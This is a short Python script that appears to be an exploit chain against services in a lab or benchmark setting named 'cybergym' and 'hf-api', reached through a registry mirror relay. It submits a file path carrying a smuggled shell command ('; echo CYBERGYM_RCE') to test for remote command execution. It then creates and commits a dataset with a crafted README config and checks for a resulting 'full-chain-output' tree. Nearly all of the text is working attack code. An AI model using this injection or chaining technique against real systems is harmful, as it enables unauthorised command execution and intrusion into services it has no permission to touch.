import urllib.request,json,base64,time

def call(u,d=None,m='GET',headers={}):
 r=urllib.request.Request(u,data=json.dumps(d).encode() if d is not None else None,method=m,headers={'Content-Type':'application/json',**headers}); return urllib.request.urlopen(r,timeout=10).read().decode()
relay='http://registry-cache:8080/mirror/'
print('cyber',call(relay+'cybergym/8080/submit-function',{'path':'src/main.c; echo CYBERGYM_RCE','code':'int x;'},'POST'))
print('create',call(relay+'hf-api/8080/api/datasets',{'name':'full-chain'},'POST'))
readme='configs:\n  - format: reference\n    data_files: [spec.json]\n'
spec={'x':'plain'}
files=[{'path':'README.md','content_b64':base64.b64encode(readme.encode()).decode()},{'path':'spec.json','content_b64':base64.b64encode(json.dumps(spec).encode()).decode()}]
print('commit',call(relay+'hf-api/8080/api/datasets/full-chain/commit',{'files':files},'POST'))
time.sleep(3)
print('tree',call(relay+'hf-api/8080/api/datasets/full-chain-output/tree'))
